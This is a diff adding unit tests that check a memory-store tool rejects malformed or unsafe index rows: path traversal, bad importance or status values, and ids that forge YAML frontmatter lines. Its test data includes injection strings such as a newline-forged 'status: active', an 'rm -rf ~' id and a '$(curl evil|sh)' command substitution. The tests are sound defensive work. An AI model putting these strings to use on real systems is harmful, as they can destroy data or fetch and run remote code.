+  it("accepts a well-formed row and a null project (control)", async () => {
+    const { missingRewriteField, isRewritableEntry } = await import("../../src/memory/apply.js");
+    expect(missingRewriteField(complete())).toBeNull();
+    expect(missingRewriteField(complete({ id: "core/g/rule", type: "core", project: null, scope: "global" }))).toBeNull();
+    expect(isRewritableEntry(complete())).toBe(true);
+  });
+
+  it("rejects a traversing / unsafe `project`, and that row really would throw in canonicalMemoryPath", async () => {
+    const { missingRewriteField, isRewritableEntry } = await import("../../src/memory/apply.js");
+    const { canonicalMemoryPath } = await import("../../src/memory/gate.js");
+    for (const project of ["../x", "..", ".", "a/b", "a\\b", ""]) {
+      const row = complete({ project });
+      expect(missingRewriteField(row)).toMatch(/project/);
+      expect(isRewritableEntry(row)).toBe(false);
+      // proof the gate is load-bearing: the derivation genuinely throws on this row
+      expect(() => canonicalMemoryPath(row)).toThrow(/memory path/i);
+    }
+  });
+
+  it("rejects an `id` whose SLUG segment is unsafe, and that row really would throw in canonicalMemoryPath", async () => {
+    const { missingRewriteField, isRewritableEntry } = await import("../../src/memory/apply.js");
+    const { canonicalMemoryPath } = await import("../../src/memory/gate.js");
+    for (const id of ["semantic/p/..", "..", ".", "semantic/p/a..b", "semantic/p/"]) {
+      const row = complete({ id });
+      expect(missingRewriteField(row)).toMatch(/id/);
+      expect(isRewritableEntry(row)).toBe(false);
+      expect(() => canonicalMemoryPath(row)).toThrow(/memory path/i);
+    }
+  });
+
+  it("the reported defect reads as a phrase memory-unarchive can print", async () => {
+    const { missingRewriteField, describeRewriteDefect } = await import("../../src/memory/apply.js");
+    // a genuinely ABSENT field keeps the original "missing <field>" wording
+    const noTitle = { ...complete() } as Record<string, unknown>;
+    delete noTitle.title;
+    expect(describeRewriteDefect(missingRewriteField(noTitle as unknown as MemoryEntry)!)).toBe("missing title");
+    // a PRESENT-but-unsafe ingredient must not be described as "missing"
+    expect(describeRewriteDefect(missingRewriteField(complete({ project: "../x" }))!)).not.toMatch(/missing/);
+    expect(describeRewriteDefect(missingRewriteField(complete({ project: "../x" }))!)).toMatch(/unsafe.*project/i);
+  });
+});
+
+describe("missingRewriteField — round-23: `importance` must be a FINITE NUMBER", () => {
+  // Round-23: the gate accepted a row whose `importance` was ABSENT or NON-NUMERIC,
+  // but importance is part of what the archival PLAN reads: planArchival's
+  // near-duplicate pass ranks a pair by it, and Rule 5 thresholds on it. With
+  // `undefined` on one side, `undefined !== 5` is true and `undefined < 5` is
+  // FALSE — so the HEALTHY, higher-importance entry was selected as the LOSER and
+  // archived while the malformed row stayed hot. Same victim-clobbering class as
+  // the key/id bug: a single corrupt row demoting a good record.
+  //
+  // It matters on the rewrite side too: `req(undefined, "0")` silently invents
+  // `importance: 0` in the .md while the index row keeps no importance at all —
+  // a quiet index/.md divergence on a command that only meant to stamp a status.
+  const complete = (over: Partial<MemoryEntry> = {}): MemoryEntry => mk({
+    id: "semantic/p/x", type: "semantic", scope: "project:p", project: "p", title: "T", ...over,
+  });
+
+  it("accepts any finite importance, including 0 and a float (control)", async () => {
+    const { missingRewriteField, isRewritableEntry } = await import("../../src/memory/apply.js");
+    for (const importance of [0, 1, 5, 2.5, -1]) {
+      expect(missingRewriteField(complete({ importance }))).toBeNull();
+      expect(isRewritableEntry(complete({ importance }))).toBe(true);
+    }
+  });
+
+  it("reports an ABSENT importance as MISSING", async () => {
+    const { missingRewriteField, describeRewriteDefect, isRewritableEntry } = await import("../../src/memory/apply.js");
+    for (const unset of [undefined, null]) {
+      const row = { ...complete(), importance: unset } as unknown as MemoryEntry;
+      expect(missingRewriteField(row)).toBe("importance");
+      expect(describeRewriteDefect(missingRewriteField(row)!)).toBe("missing importance");
+      expect(isRewritableEntry(row)).toBe(false);
+    }
+    const deleted = { ...complete() } as Record<string, unknown>;
+    delete deleted.importance;
+    expect(missingRewriteField(deleted as unknown as MemoryEntry)).toBe("importance");
+  });
+
+  it("reports a PRESENT-but-unusable importance as UNSAFE, never as missing", async () => {
+    const { missingRewriteField, describeRewriteDefect, isRewritableEntry } = await import("../../src/memory/apply.js");
+    for (const bad of ["5", "", NaN, Infinity, -Infinity, {}, [], true]) {
+      const row = { ...complete(), importance: bad } as unknown as MemoryEntry;
+      expect(missingRewriteField(row)).toBe("unsafe importance");
+      expect(describeRewriteDefect(missingRewriteField(row)!)).not.toMatch(/missing/);
+      expect(describeRewriteDefect(missingRewriteField(row)!)).toMatch(/unsafe.*importance/i);
+      expect(isRewritableEntry(row)).toBe(false);
+    }
+  });
+});
+
+describe("missingRewriteField — round-27: `status` must be one of the FOUR MemoryEntry statuses", () => {
+  // Round-27: the gate only checked that `status` was a STRING. A
+  // parseable-but-malformed row carrying `status: "blocked"` therefore passed,
+  // reached planArchival, and — because `archivable()` only excludes `pinned`
+  // and `archived` — counted as ARCHIVABLE, so the expired / unused-low-value
+  // rules would automatically flip that corrupt row to `archived`. A corrupt row
+  // must be SKIPPED and COUNTED, never silently mutated.
+  const complete = (over: Partial<MemoryEntry> = {}): MemoryEntry => mk({
+    id: "semantic/p/x", type: "semantic", scope: "project:p", project: "p", title: "T", ...over,
+  });
+
+  it("accepts all FOUR valid statuses (control + regression lock)", async () => {
+    const { missingRewriteField, isRewritableEntry } = await import("../../src/memory/apply.js");
+    // archived must stay accepted (memory-unarchive's only actionable input) and
+    // superseded must too (the archive planner's superseded-cleanup rule reads it).
+    for (const status of ["active", "superseded", "pinned", "archived"] as const) {
+      expect(missingRewriteField(complete({ status }))).toBeNull();
+      expect(isRewritableEntry(complete({ status }))).toBe(true);
+    }
+  });
+
+  it("reports an ABSENT status as MISSING", async () => {
+    const { missingRewriteField, describeRewriteDefect, isRewritableEntry } = await import("../../src/memory/apply.js");
+    for (const unset of [undefined, null]) {
+      const row = { ...complete(), status: unset } as unknown as MemoryEntry;
+      expect(missingRewriteField(row)).toBe("status");
+      expect(describeRewriteDefect(missingRewriteField(row)!)).toBe("missing status");
+      expect(isRewritableEntry(row)).toBe(false);
+    }
+    const deleted = { ...complete() } as Record<string, unknown>;
+    delete deleted.status;
+    expect(missingRewriteField(deleted as unknown as MemoryEntry)).toBe("status");
+  });
+
+  it("reports an UNKNOWN or non-string status as UNSAFE, never as missing", async () => {
+    const { missingRewriteField, describeRewriteDefect, isRewritableEntry } = await import("../../src/memory/apply.js");
+    // "blocked" is THE landmine: a plausible-looking status the planner treated
+    // as archivable. The rest cover casing/whitespace drift and non-strings.
+    for (const bad of ["blocked", "", "ACTIVE", "Archived", " active", "active ", 42, {}, [], true]) {
+      const row = { ...complete(), status: bad } as unknown as MemoryEntry;
+      expect(missingRewriteField(row)).toBe("unsafe status");
+      expect(describeRewriteDefect(missingRewriteField(row)!)).not.toMatch(/missing/);
+      expect(describeRewriteDefect(missingRewriteField(row)!)).toMatch(/unsafe.*status/i);
+      expect(isRewritableEntry(row)).toBe(false);
+    }
+  });
+
+  it("isMemoryStatus recognizes exactly the union — nothing more (shared with memory-unarchive)", async () => {
+    const { isMemoryStatus } = await import("../../src/memory/apply.js");
+    for (const ok of ["active", "superseded", "pinned", "archived"]) expect(isMemoryStatus(ok)).toBe(true);
+    for (const bad of ["blocked", "", undefined, null, 42, {}, []]) expect(isMemoryStatus(bad)).toBe(false);
+  });
+});
+
+describe("missingRewriteField — round-33: the id check is scoped to WRITE safety, not shell safety", () => {
+  // Round-32 fixed a real hole: the gate validated only the id's FINAL SEGMENT
+  // (`isSafePathSegment(id.split("/").pop())`), so a KEY-CONSISTENT row whose id
+  // carried a NEWLINE in an EARLIER segment — `semantic/p\nforged: value/safe` —
+  // passed, got PLANNED by the unattended `memory-archive --apply` digest
+  // consolidation, and reached the rewriter. `renderMemoryMarkdown` writes
+  // `id: ${entry.id}` into YAML FRONTMATTER, which is LINE-ORIENTED: the newline
+  // emits an EXTRA `forged: value` line that `parse` reads back as a REAL FIELD.
+  // Forging `status: active` there silently UN-ARCHIVES an entry.
+  //
+  // …but it fixed it with the WRONG predicate. It reused `isSafeMemoryId`, which
+  // exists to guard rendering a copy-pasteable SHELL COMMAND (round-28) and so
+  // rejects ALL WHITESPACE. The rewrite gate only has to stop FRONTMATTER
+  // INJECTION (ASCII control characters) and PATH ABUSE. A SPACE does neither —
+  // and spaces are REAL: `projectSlugFromPath` doesn't sanitize, so a checkout at
+  // `~/code/my project` yields the slug `code-my project` and ids like
+  // `semantic/code-my project/some-slug`. The over-strict gate made EVERY memory
+  // in such a project a "malformed index row". Round-33 gives the write side its
+  // own `isWritableMemoryId`; the two predicates are deliberately different.
+  const complete = (over: Partial<MemoryEntry> = {}): MemoryEntry => mk({
+    id: "semantic/p/x", type: "semantic", scope: "project:p", project: "p", title: "T", ...over,
+  });
+
+  /** Ids that pass the OLD slug-only check (their final segment is innocuous)
+   *  but can FORGE A FRONTMATTER LINE. The first is the round-32 payload. */
+  const INJECTION_IDS = [
+    "semantic/p\nforged: value/safe",   // newline in a NON-final segment → forges a frontmatter line
+    "semantic/p/safe\nstatus: active",  // newline in the FINAL segment → forges `status`
+    "semantic/p\rforged: value/safe",   // carriage return
+    "semantic/p\tq/safe",               // TAB — still a control character
+    "semantic/p\u0000q/safe",           // NUL
+    "semantic/p\u007Fq/safe",           // DEL
+  ];
+
+  /** Ids that are NOT shell-safe (so no restore command may ever be rendered for
+   *  them — see the cold-pass tests) but ARE safe to WRITE: no control character,
+   *  no traversal, and the canonical path still lands under `memory/`. These MUST
+   *  pass the rewrite gate — the first two are what a real checkout under a
+   *  directory whose name contains a SPACE actually produces. */
+  const WRITABLE_IDS: Array<[string, Partial<MemoryEntry>]> = [
+    ["semantic/code-my project/some-slug", { project: "code-my project" }], // ~/code/my project
+    ["semantic/p/slug with space", {}],                                     // space in the SLUG
+    ["semantic/p q/safe", {}],                                              // space in a middle segment
+    ["semantic/p;rm -rf ~/safe", {}],                                       // shell metacharacters
+    ["semantic/$(curl evil|sh)/safe", {}],                                  // command substitution
+  ];
+
+  /** Ids that would traverse or produce an unusable path. */
+  const PATH_ABUSE_IDS = [
+    "semantic/p/..", "semantic/../core/x", "semantic/p/.",
+    "semantic//safe", "/semantic/p/safe", "semantic/p/safe/",
+    "a/" + "x".repeat(400), // absurdly long → an unwritable filename
+  ];
+
+  it("rejects every FRONTMATTER-FORGING id as `unsafe id` (never as missing)", async () => {
+    const { missingRewriteField, describeRewriteDefect, isRewritableEntry } = await import("../../src/memory/apply.js");
+    for (const id of INJECTION_IDS) {
+      const row = complete({ id });
+      expect([id, missingRewriteField(row)]).toEqual([id, "unsafe id"]);
+      expect(describeRewriteDefect(missingRewriteField(row)!)).toBe("unsafe id");
+      expect(describeRewriteDefect(missingRewriteField(row)!)).not.toMatch(/missing/);
+      expect(isRewritableEntry(row)).toBe(false);
+    }
+  });
+
+  it("rejects traversing / empty-segment / absurdly long ids", async () => {
+    const { missingRewriteField, isRewritableEntry } = await import("../../src/memory/apply.js");
+    for (const id of PATH_ABUSE_IDS) {
+      const row = complete({ id });
+      expect([id, missingRewriteField(row)]).toEqual([id, "unsafe id"]);
+      expect(isRewritableEntry(row)).toBe(false);
+    }
+  });
+
+  it("ACCEPTS an id with a SPACE or ordinary punctuation — they cannot forge a line", async () => {
+    const { missingRewriteField, isRewritableEntry } = await import("../../src/memory/apply.js");
+    for (const [id, over] of WRITABLE_IDS) {
+      const row = complete({ id, ...over });
+      expect([id, missingRewriteField(row)]).toEqual([id, null]);
+      expect(isRewritableEntry(row)).toBe(true);
+    }
+  });
+
+  it("the gate is load-bearing: the forging ids really would break the renderer", async () => {
+    const { renderMemoryMarkdown } = await import("../../src/memory/render.js");
+    for (const id of INJECTION_IDS) {
+      expect(() => renderMemoryMarkdown(complete({ id }), "body")).toThrow(/control character/);
+    }
+  });
+
+  it("a writable-but-not-shell-safe id renders ONE clean `id:` line (no forged key)", async () => {
+    const { renderMemoryMarkdown } = await import("../../src/memory/render.js");
+    for (const [id, over] of WRITABLE_IDS) {
+      const md = renderMemoryMarkdown(complete({ id, ...over }), "body");
+      expect([id, md.match(/^id: .*$/gm)]).toEqual([id, [`id: ${id}`]]);
+    }
+  });
+
+  it("the write gate and the SHELL-safety predicate are DELIBERATELY different", async () => {
+    const { missingRewriteField } = await import("../../src/memory/apply.js");
+    const { isSafeMemoryId, isWritableMemoryId } = await import("../../src/memory/gate.js");
+    // The gate follows the WRITE predicate exactly…
+    for (const [id, over] of WRITABLE_IDS) {
+      expect([id, missingRewriteField(complete({ id, ...over })) === "unsafe id"]).toEqual([id, !isWritableMemoryId(id)]);
+    }
+    for (const id of [...INJECTION_IDS, ...PATH_ABUSE_IDS]) {
+      expect([id, missingRewriteField(complete({ id })) === "unsafe id"]).toEqual([id, !isWritableMemoryId(id)]);
+    }
+    // …and the two predicates genuinely disagree, which is the point: every
+    // WRITABLE_IDS entry is writable yet NOT shell-safe. If someone "unifies"
+    // them again this fails.
+    for (const [id] of WRITABLE_IDS) {
+      expect([id, isWritableMemoryId(id), isSafeMemoryId(id)]).toEqual([id, true, false]);
+    }
+    // Neither predicate is a superset in the other direction: a control character
+    // and a traversal are rejected by BOTH.
+    for (const id of [...INJECTION_IDS, ...PATH_ABUSE_IDS]) {
+      expect([id, isWritableMemoryId(id), isSafeMemoryId(id)]).toEqual([id, false, false]);
+    }
+    // Canonical ids pass both.
+    for (const id of ["semantic/p/x", "core/_global/rule", "semantic/my.proj-1/a.b-c"]) {
+      expect([id, isWritableMemoryId(id), isSafeMemoryId(id)]).toEqual([id, true, true]);
+    }
+  });
+
+  it("canonical ids still pass, including dotted/dashed segments (regression lock)", async () => {
+    const { missingRewriteField, isRewritableEntry } = await import("../../src/memory/apply.js");
+    const ok: Array<[string, Partial<MemoryEntry>]> = [
+      ["semantic/p/x", {}],
+      ["core/_global/rule", { type: "core", project: null, scope: "global" }],
+      ["semantic/my.proj-1/a.b-c", { project: "my.proj-1" }],
+      ["episodic/code-demo/thread-7", { type: "episodic", project: "code-demo" }],
+    ];
+    for (const [id, over] of ok) {
+      const row = complete({ id, ...over });
+      expect([id, missingRewriteField(row)]).toEqual([id, null]);
+      expect(isRewritableEntry(row)).toBe(true);
+    }
+  });
+});
+
+describe("applyMemoryItems — round-32 (SECURITY): a newline in an id must never forge frontmatter", () => {
+  // The shared write sink renders a BRAND-NEW .md (no body recovery, no identity
+  // guard), and it derives the file path from the id's SLUG only — so an id
+  // carrying a newline in an earlier segment used to be written verbatim into the
+  // frontmatter, emitting EXTRA `key: value` lines that `parseMemoryMarkdown`
+  // reads back as REAL FIELDS (a forged `status: active` silently un-archives).
+  // The renderer now refuses control characters in the identifier scalars, so the
+  // write fails closed and rolls back instead of persisting a forged document.
+  let home: string, repo: string;
+  beforeEach(() => {
+    home = mkdtempSync(join(tmpdir(), "vbp-apply-inj-"));
+    vi.stubEnv("HOME", home);
+    repo = join(home, ".memarium", "session-repo");
+    mkdirSync(join(repo, ".memarium"), { recursive: true });
+  });
+  afterEach(() => { vi.unstubAllEnvs(); rmSync(home, { recursive: true, force: true }); });
+
+  it("refuses the write and leaves NO .md carrying the forged key", async () => {
+    const { applyMemoryItems } = await import("../../src/memory/apply.js");
+    const poisoned = mk({
+      id: "semantic/p\nforged: value/safe", type: "semantic", scope: "project:p",
+      project: "p", title: "T", path: "",
+    });
+    expect(() => applyMemoryItems(repo, [{ entry: poisoned, body: "b" }])).toThrow();
+    const abs = join(repo, "memory/semantic/p/safe.md");
+    if (existsSync(abs)) expect(readFileSync(abs, "utf8")).not.toMatch(/^forged:/m);
+    expect(existsSync(abs)).toBe(false);
+  });
+
+  it("a normal item still writes through the same sink (regression lock)", async () => {
+    const { applyMemoryItems } = await import("../../src/memory/apply.js");
+    const ok = mk({ id: "semantic/p/fine", type: "semantic", scope: "project:p", project: "p", title: "T", path: "" });
+    expect(applyMemoryItems(repo, [{ entry: ok, body: "b" }]).written).toBe(1);
+    expect(readFileSync(join(repo, "memory/semantic/p/fine.md"), "utf8")).toContain("id: semantic/p/fine");
+  });
 });
